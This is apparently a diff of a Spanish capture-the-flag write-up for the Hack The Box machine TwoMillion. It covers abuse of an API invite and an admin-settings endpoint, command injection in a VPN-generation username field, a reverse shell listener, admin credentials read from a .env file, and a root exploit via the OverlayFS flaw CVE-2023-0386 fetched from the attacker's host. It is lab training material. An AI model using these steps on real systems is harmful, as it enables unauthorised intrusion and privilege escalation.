@@ -21,9 +21,9 @@ layout:
 
 ***
 
+## Reconnaissance
 
-
-
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **TwoMillion**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.221 -oG allPorts
@@ -47,7 +47,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.09 seconds
            Raw packets sent: 65535 (2.884MB) | Rcvd: 65553 (2.623MB)
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -60,7 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 12.09 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos. En el resultado, comprobamos que se encuentran abierta una página web de `Nginx` y el servicio de `SSH`.
 
 ```bash
 ❯ nmap -sCV -p22,80 10.10.11.221 -A -oN targeted -oX targetedXML
@@ -97,27 +97,40 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 11.62 seconds
 ```
 
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
+```bash
+❯ xsltproc targetedXML > index.html
+
+❯ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../.gitbook/assets/imagen (22).png" alt=""><figcaption></figcaption></figure>
 
-
+Añadiremos la siguiente entrada en nuestro archivo `/etc/hosts`.
 
 ```bash
-❯ catnp /etc/hosts | grep 2million
+❯ cat /etc/hosts | grep 2million
 10.10.11.221 2million.htb
 ```
 
+## Web Enumeration
 
+Realizaremos una comprobación de las tecnologías que utiliza el sitio web.
 
 ```bash
 ❯ whatweb http://2million.htb
 http://2million.htb [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[info@hackthebox.eu], Frame, HTML5, HTTPServer[nginx], IP[10.10.11.221], Meta-Author[Hack The Box], Script, Title[Hack The Box :: Penetration Testing Labs], X-UA-Compatible[IE=edge], YouTube, nginx
 ```
 
+Al acceder a http://2million.htb, verificamos que es la siguiente página web que simula la antigua interfaz de `HackTheBox`.
+
 <figure><img src="../../.gitbook/assets/5050_vmware_okQXKGjf5k.png" alt=""><figcaption></figcaption></figure>
 
-
+Realizaremos una enumeración de directorios y páginas web de la aplicación web. Verificamos en el resultado ha logrado enumerar diferentes directorios y páginas entre las cuales destacan `api`, `login`, `invite` y `register`. Esto lo enumeraremos más adelante.
 
 ```bash
 ❯ feroxbuster -u http://2million.htb/ -t 200 -C 500,502,404
@@ -161,171 +174,170 @@ by Ben "epi" Risher 🤓                 ver: 2.11.0
 405      GET        0l        0w        0c http://2million.htb/api/v1/user/login
 ```
 
-
-
-
+Al acceder a [http://2million.htb/login](http://2million.htb/login), nos encontramos con la siguiente interfaz de inicio de sesión de HTB.
 
 <figure><img src="../../.gitbook/assets/5051_vmware_EMJQiNFdNQ.png" alt=""><figcaption></figcaption></figure>
 
+Accedemos a [http://2million.htb/register](http://2million.htb/register) y comprobamos la siguiente interfaz que nos permite registrar nuestro usuario. Al intentar registrarnos, debemos de disponer de un `Invite code` válido.
 
+<figure><img src="../../.gitbook/assets/imagen (1) (1) (1).png" alt="" width="369"><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (1) (1).png" alt=""><figcaption></figcaption></figure>
+## Initial Foothold
 
+### Abusing declared JavaScript functions from the browser console
 
-
-[http://2million.htb/invite](http://2million.htb/invite) a
-
-
+Al acceder a [http://2million.htb/invite](http://2million.htb/invite), comprobamos que debemos de introducir un  `Invite Code`.
 
 <figure><img src="../../.gitbook/assets/5054_vmware_wzWRsAd2ON.png" alt=""><figcaption></figcaption></figure>
 
+Al revisar el código fuente, verificamos que hay un script de JS relacionada con la API y con el `Invite Code`.
 
+<figure><img src="../../.gitbook/assets/imagen (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/imagen (2) (1).png" alt=""><figcaption></figcaption></figure>
-
-
+Al ingresar al script en cuestión, verificamos de la existencia de una función llamada `makeInviteCode`.
 
 <figure><img src="../../.gitbook/assets/imagen (3) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Abriremos el `Console` del navegador y probaremos de llamar a la función `makeInviteCode`. Verificamos que al ejecutar la función declarada de JS, se nos proporciona una información codificada en Rot13.
 
 <figure><img src="../../.gitbook/assets/imagen (4) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Realizamos la descodificación del contenido cifrado en Rot13. Comprobamos el siguiente mensaje, en el cual se menciona que para generar un `invite code`, deberemos de realizar una petición por `POST` a `/api/v1/invite/generate`.
 
 ```bash
 ❯ rot13 'Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr'
 In order to generate the invite code, make a POST request to /api/v1/invite/generate
 ```
 
+### Abusing the API to generate a valid invite code
 
+Realizaremos la solicitud por el método `POST` al `endpoint` que se nos indicaba. Verificamos que nos proporcionan un código codificado en lo que parece ser una cadena de `Base64`.
 
 ```bash
-❯ curl -s -X POST 'http://2million.htb/api/v1/invite/generate'
-{"0":200,"success":1,"data":{"code":"MlI1QlotVzFCR1UtNzM5MzMtMVc1NUY=","format":"encoded"}}
+❯ curl -s -X POST 'http://2million.htb/api/v1/invite/generate' | jq
+{
+  "0": 200,
+  "success": 1,
+  "data": {
+    "code": "MlI1QlotVzFCR1UtNzM5MzMtMVc1NUY=",
+    "format": "encoded"
+  }
+}
 ```
 
-
+Descodificaremos el contenido anterior en `Base64` y comprobamos que parece proporcionarnos lo que parece ser el `invite code`.
 
 ```bash
 ❯ echo 'MlI1QlotVzFCR1UtNzM5MzMtMVc1NUY=' | base64 -d; echo
 2R5BZ-W1BGU-73933-1W55F
 ```
 
-
+Desde [http://2million.htb/verify](http://2million.htb/verify), ingresaremos el `invite code` y lde daremos a la opción de `Sign UP` para continuar con el registro de nuestro usuario.
 
 <figure><img src="../../.gitbook/assets/5058_vmware_ElSNZczC5A.png" alt=""><figcaption></figcaption></figure>
 
-
+Verificamos que se nos ha rellenado automáticamente el campo de `Invite code` y al parecer ahora si nos debería permitir registrarnos correctamente.
 
 <figure><img src="../../.gitbook/assets/imagen (5) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Una vez registrado nuestro usuario, probaremos de iniciar sesión en [http://2million.htb/login](http://2million.htb/login).
 
 <figure><img src="../../.gitbook/assets/imagen (6) (1).png" alt=""><figcaption></figcaption></figure>
 
+### Abusing the API to elevate our privilege to administrator
 
+Comprobaremos que hemos podido acceder correctamente a la página de `HackTheBox` con nuestro usuario recién registrado.
 
 <figure><img src="../../.gitbook/assets/imagen (7) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Al enumerar las diferentes opciones de la página web, verificamos que al hacer `hovering` en las opciones de `Connection Pack` o `Regenerate`, se nos muestra un `endpoint` de una `API`.
 
 <figure><img src="../../.gitbook/assets/imagen (8) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Interceptaremos la solicitud con `BurpSuite`, y comprobamos que accediendo al `endpoint` de `/api/v1/user/vpn/generate`, en la respuesta port parte del servidor se nos proporciona el contenido de la VPN generada.
 
 <figure><img src="../../.gitbook/assets/imagen (9) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Intentamos enumerar la `API` desde la raíz, en el resultado obtenido se nos indica el `endpoint` llamado `/api/v1`.
 
 <figure><img src="../../.gitbook/assets/imagen (10) (1).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-
+Accediendo al `endponint` llamado `/api/v1` se nos proporciona los detalles completos de la `API`, con las diferentes opciones que ofrece.
 
 <figure><img src="../../.gitbook/assets/imagen (11) (1).png" alt=""><figcaption></figcaption></figure>
 
+Mediante el método `GET`, tratamos de verificar en el `endpoint` nombrado `/api/v1/admin/auth` si el usuario actual que disponemos tenía permisos de administración.
 
+En la respuesta por parte del servidor, se nos indicaba que no disponíamos de permisos de administración.
 
 <figure><img src="../../.gitbook/assets/5066_vmware_HlPHi7MMHy.png" alt=""><figcaption></figcaption></figure>
 
+Tratamos de investigar sobre el `endpoint` llamado `/api/v1/admin/settings/update` que según se nos indicaba, nos permitiría modificar la configuración de los usuarios.
 
+La solicitud la deberemos tramitar por el método `PUT`, en este caso, se nos indicaba que el `Content-Type` no era válido. Esto debido que normalmente las `API` esperan un formato `JSON`, tal y como se aprecia en la respuesta del servidor.
 
 <figure><img src="../../.gitbook/assets/imagen (12) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Modificamos el `Content-Type` para que sea el `application/json` y el enviar nuevamente la solicitud, se nos indica de la falta del parámetro `email`.
 
 <figure><img src="../../.gitbook/assets/imagen (13) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Añadiremos el parámetro `email` y indicaremos el de nuestro usuario registrado. Al enviar la petición se nos indicaba nuevamente la falta de un parámetro, en este caso, el parámetro `is_admin`.
 
 <figure><img src="../../.gitbook/assets/5069_vmware_oAgmIhH5nY.png" alt=""><figcaption></figcaption></figure>
 
-
+Añadimos el parámetro `is_admin` y le indicaremos el valor `True` para realizar una prueba. En la respuesta por parte del servidor, se nos indica que debemos de indicar el valor `0` (no administrador) o `1` (administrador).
 
 <figure><img src="../../.gitbook/assets/imagen (14) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Volvemos a adaptar nuestra solicitud, al enviarla nuevamente se nos proporciona que el usuario `gzzcoo` ha sido modificado como usuario administrador.
 
 <figure><img src="../../.gitbook/assets/imagen (15) (1).png" alt=""><figcaption></figcaption></figure>
 
+Realizaremos la solicitud por `GET` del `endpoint` llamado `/api/v1/admin/auth` para verificar si el usuario que disponemos después de la modificación si tiene los permisos de administración. Verificamos que hemos conseguido proporcionarle los permisos correspondientes.
 
+{% hint style="warning" %}
+IMPORTANTE: deberemos de eliminar el `Content-Type` de `JSON` y los datos anteriores, para no tener problemas con la solicitud.
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/imagen (16) (1).png" alt=""><figcaption></figcaption></figure>
 
+Ahora que disponemos de permisos de administración, verificamos que disponemos del acceso al `endpoint` llamado `/api/v1/admin/vpn/generate`, en la cual mediante el método `POST`, podemos generar una nueva VPN a cualquier usuario.
 
+En este caso, al tramitar la solicitud, se nos vuelve a indicar que hace falta el `Content-Type` correcto.
 
 <figure><img src="../../.gitbook/assets/imagen (17) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Al enviar la solicitud, con el `Content-Type` de `application/json` añadido, se nos indica la falta del parámetro `username`.
 
 <figure><img src="../../.gitbook/assets/imagen (18) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Añadiremos el parámetro `username` y realizaremos la prueba con nuestro mismo usuario. Al enviar la solicitud, se nos genera una VPN para nuestro usuario.
 
 <figure><img src="../../.gitbook/assets/imagen (19) (1).png" alt=""><figcaption></figcaption></figure>
 
+### Command Injection via poorly designed API functionality
 
+Es probable que el código en `PHP` no sea el que genera la clave VPN directamente, sino que esté ejecutando algún script en `Bash` para manejar la generación. Deberemos confirmar si podemos inyectar comandos.
 
-<figure><img src="../../.gitbook/assets/imagen (20) (1).png" alt=""><figcaption></figcaption></figure>
+Si el servidor está ejecutando algo como:  `generate_vpn.sh [username]`. Podemos intentar inyectar un `;` en el nombre de usuario para cortar el comando y ejecutar uno nuevo. También podemos añadir al final de nuevo un `;` o `#` para comentar el resto de código en el caso que lo hubiera,
 
+Al realizar la prueba, verificamos que hemos logrado un `Command Injection` y `RCE`.
 
+<figure><img src="../../.gitbook/assets/imagen (1).png" alt=""><figcaption></figcaption></figure>
 
-```bash
-❯ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-```
-
-
-
-
-
-<figure><img src="../../.gitbook/assets/5078_vmware_ejwqXSrHdI.png" alt=""><figcaption></figcaption></figure>
-
-```bash
-❯ python3 -m http.server 80
-Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
-10.10.11.221 - - [16/Feb/2025 23:51:02] code 404, message File not found
-10.10.11.221 - - [16/Feb/2025 23:51:02] "GET /gzzcoo HTTP/1.1" 404 -
-10.10.11.221 - - [16/Feb/2025 23:51:03] code 404, message File not found
-10.10.11.221 - - [16/Feb/2025 23:51:03] "GET /gzzcoo.ovpn HTTP/1.1" 404 -
-```
-
-
+El siguiente paso, será lograr obtener acceso al sistema a través de una Reverse Shell. Para ello, nos pondremos en escucha con `nc`.
 
 ```bash
 ❯ nc -nlvp 443
 listening on [any] 443 ...
 ```
 
-
+Ejecutaremos la siguiente `Command Injection` que nos proporcione la Reverse Shell.
 
 <figure><img src="../../.gitbook/assets/5079_vmware_WnqOiiQOq2.png" alt=""><figcaption></figcaption></figure>
 
-
+Verificamos que hemos ganado acceso al sistema y nos encontramos como usuario `www-data`. Al obtener la reverse shell, mejoramos la calidad de la shell con los siguientes pasos para obtener una TTY interactiva.
 
 ```bash
 ❯ nc -nlvp 443
@@ -346,7 +358,11 @@ www-data@2million:~/html$ export SHELL=bash
 www-data@2million:~/html$ stty rows 46 columns 230
 ```
 
+## Initial Access
 
+### Information Leakage
+
+Enumerando el directorio actual donde nos encontramos, revisamos la existencia de un archivo `.env`, que suele ser de entornos virtuales y traer configuraciones.
 
 ```bash
 www-data@2million:~/html$ ls -la
@@ -367,7 +383,7 @@ drwxr-xr-x  3 root root 4096 Jun  6  2023 js
 drwxr-xr-x  2 root root 4096 Jun  6  2023 views
 ```
 
-
+Al revisar el contenido del archivo `.env`, se logra obtener las credenciales del usuario `admin`. Revisamos el archivo `/etc/passwd` y verificamos que existe el usuario `admin` y además dispone de `bash`. Con lo cual, posiblemente sean las credenciales de dicho usuario.
 
 ```bash
 www-data@2million:~/html$ cat .env 
@@ -382,43 +398,13 @@ www-data:x:33:33:www-data:/var/www:/bin/bash
 admin:x:1000:1000::/home/admin:/bin/bash
 ```
 
-
+Tratamos de acceder desde `SSH` con las credenciales del usuario `admin`, finalmente logramos el acceso correspondiente y podemos visualizar la flag de **user.txt**.
 
 ```bash
 ❯ ssh admin@2million.htb
 admin@2million.htb's password: 
 Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.70-051570-generic x86_64)
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-  System information as of Sun Feb 16 10:56:09 PM UTC 2025
-
-  System load:           0.0
-  Usage of /:            74.4% of 4.82GB
-  Memory usage:          9%
-  Swap usage:            0%
-  Processes:             223
-  Users logged in:       0
-  IPv4 address for eth0: 10.10.11.221
-  IPv6 address for eth0: dead:beef::250:56ff:fe94:670
-
- * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
-   just raised the bar for easy, resilient and secure K8s cluster deployment.
-
-   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
-
-Expanded Security Maintenance for Applications is not enabled.
-
-0 updates can be applied immediately.
-
-Enable ESM Apps to receive additional future security updates.
-See https://ubuntu.com/esm or run: sudo pro status
-
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
 
 You have mail.
 Last login: Tue Jun  6 12:43:11 2023 from 10.10.14.6
@@ -426,10 +412,16 @@ To run a command as administrator (user "root"), use "sudo <command>".
 See "man sudo_root" for details.
 
 admin@2million:~$ cat user.txt 
-a4b75c86191e364bafb0f5d87ddb58c8
+a4b75c8****************************
 ```
 
+## Privilege Escalation
 
+### Basic Enumeration
+
+Realizaremos una verificación inicial de los privilegios que dispone el usuario actual. Verificamos que no disponemos de algún grupo interesante ni permisos de `sudoers`.
+
+Por otro lado, también revisamos binarios con permisos de `SUID` y `capabilities` pero no logramos obtener nada interesante.
 
 ```bash
 admin@2million:~$ id
@@ -474,22 +466,43 @@ admin@2million:~$ getcap -r / 2>/dev/null
 /usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep
 ```
 
+### Kernel Exploitation - OverlayFS Vulnerability (CVE-2023-0386)
 
+Al acceder por `SSH` con el usuario `admin`, se nos indicaba que teníamos un correo electrónico. Revisaremos el contenido de `/var/mail/admin` en el cual nos encontramos con un correo dirigido a nosotros en el cual se menciona de actualizar el sistema operativo debido que han aparecido nuevos `CVE`. Recalcan la vulnerabilidad `OverlayFS` que parece ser bastante grave.
+
+```bash
+admin@2million:~$ cat /var/mail/admin 
+From: ch4p <ch4p@2million.htb>
+To: admin <admin@2million.htb>
+Cc: g0blin <g0blin@2million.htb>
+Subject: Urgent: Patch System OS
+Date: Tue, 1 June 2023 10:45:22 -0700
+Message-ID: <9876543210@2million.htb>
+X-Mailer: ThunderMail Pro 5.2
+
+Hey admin,
+
+I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.
+
+HTB Godfather
+```
+
+Revisando el kernel del equipo, parece ser una versión vulnerable a `OverlayFS`.
 
 ```bash
 admin@2million:/$ uname -a
 Linux 2million 5.15.70-051570-generic #202209231339 SMP Fri Sep 23 13:45:37 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
 ```
 
-
+Realizamos una búsqueda por Internet, y se nos menciona el `OverlayFS`.
 
 <figure><img src="../../.gitbook/assets/5080_vmware_pHC1lAFQd5.png" alt=""><figcaption></figcaption></figure>
+
+En la siguiente página web, comprobamos que la versión del kernel que dispone el equipo al parecer es vulnerable.
 
 {% embed url="https://nvd.nist.gov/vuln/detail/cve-2023-0386" %}
 
 <figure><img src="../../.gitbook/assets/imagen (21) (1).png" alt=""><figcaption></figcaption></figure>
-
-
 
 {% embed url="https://www.incibe.es/index.php/en/incibe-cert/early-warning/vulnerabilities/cve-2023-0386" %}
 
@@ -499,25 +512,25 @@ Se encontró una falla en el kernel de Linux, donde se encontró acceso no autor
 
 
 
-
+Nos encontramos con el siguiente repositorio de GitHub que nos proporcionan los archivos necesarios para explotar esta vulnerabilidad. Nos descargaremos el repositorio a través de un `.zip`.
 
 {% embed url="https://github.com/sxlmnwb/CVE-2023-0386" %}
 
-
-
 <figure><img src="../../.gitbook/assets/imagen (22) (1).png" alt=""><figcaption></figcaption></figure>
 
-
+Comprobaremos que disponemos del archivo comprimido en nuestro equipo, lo renombraremos y lo compartiremos a través de un servidor web.
 
 ```bash
 ❯ ls -l CVE-2023-0386-master.zip
 .rw-rw-r-- kali kali 11 KB Sun Feb 16 23:59:40 2025  CVE-2023-0386-master.zip
+
 ❯ mv CVE-2023-0386-master.zip gzzcoo.zip
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Desde el equipo comprometido, nos descargaremos el comprimido y lo descomprimiremos.
 
 ```bash
 admin@2million:/tmp$ wget 10.10.16.3/gzzcoo.zip
@@ -548,7 +561,7 @@ Archive:  gzzcoo.zip
   inflating: CVE-2023-0386-master/test/mnt.c 
 ```
 
-
+Accederemos al directorio correspondiente y ejecutaremos `make all` para compilar el proyecto.
 
 ```bash
 admin@2million:/tmp$ cd CVE-2023-0386-master/
@@ -585,7 +598,7 @@ gcc -o exp exp.c -lcap
 gcc -o gc getshell.c
 ```
 
-
+Verificamos que se nos han generado diversos archivos adicionales.
 
 ```bash
 admin@2million:/tmp/CVE-2023-0386-master$ ls -l
@@ -602,14 +615,14 @@ drwxrwxr-x 2 admin admin    4096 May 16  2023 ovlcap
 drwxrwxr-x 2 admin admin    4096 May 16  2023 test
 ```
 
-
+Siguiendo la explotación, deberemos de ejecutar los siguientes archivos para conseguir acceso como `root`.
 
 ```bash
 admin@2million:/tmp/CVE-2023-0386-master$ ./fuse ./ovlcap/lower ./gc
 [+] len of gc: 0x3ee0
 ```
 
-
+Deberemos de disponer de otra nueva terminal, ya que desde esta deberemos de ejecutar el comando `./exp` el cual finalmente obtendremos acceso como `root` y podremos visualizar la flag **root.txt**.
 
 ```bash
 admin@2million:/tmp/CVE-2023-0386-master$ ./exp
@@ -626,5 +639,5 @@ See "man sudo_root" for details.
 root@2million:/tmp/CVE-2023-0386-master# whoami
 root
 root@2million:/tmp/CVE-2023-0386-master# cat /root/root.txt 
-4d832b818337f4334dffa909960ee48d
+4d832b818337********************
 ```
